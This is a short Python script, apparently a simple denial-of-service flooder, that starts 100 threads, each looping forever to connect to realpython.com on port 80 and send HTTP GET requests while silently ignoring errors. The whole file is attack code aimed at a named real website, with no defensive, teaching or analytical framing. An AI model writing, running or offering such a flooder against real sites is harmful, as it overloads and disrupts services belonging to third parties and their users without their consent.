import socket
import threading

target = "realpython.com"#no https and no / the socket only needs the host/ domain name
port = 80
def attack():
    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((target, port))
            http_request = b"GET / HTTP/1.1\r\nHost: realpython.com\r\n\r\n"
            s.send(http_request)
            s.close()
        except Exception as e:
            pass
for i in range(100):
    thread = threading.Thread(target=attack)
    thread.start()